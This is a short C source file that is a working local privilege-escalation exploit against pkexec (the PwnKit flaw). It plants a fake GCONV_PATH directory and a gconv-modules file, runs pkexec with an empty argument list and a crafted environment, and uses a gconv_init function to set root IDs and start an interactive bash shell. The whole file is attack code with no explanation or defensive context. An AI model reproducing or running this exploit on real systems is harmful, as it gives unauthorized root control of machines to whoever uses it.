#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    printf("Executing exploit...\n");

    system("mkdir 'GCONV_PATH=.' && touch 'GCONV_PATH=./pwn' && chmod +x 'GCONV_PATH=./pwn'");
    system("mkdir pwn && echo 'module UTF-8// PWN// exploit 2' >pwn/gconv-modules && cp exploit.so pwn/");

    char * const pkexec_argv[] = {
        NULL
    };
    char * const pkexec_envp[] = {
        "pwn",
        "PATH=GCONV_PATH=.",
        "SHELL=/undefined",
        "CHARSET=PWN",
        NULL
    };

    return execve("/usr/bin/pkexec", pkexec_argv, pkexec_envp);
}

void gconv(void) {}

void gconv_init(void *step)
{
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);

    char * const shell[] = { "/bin/bash", "-i", NULL };
    char * const env_vars[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

    execve(shell[0], shell, env_vars);
}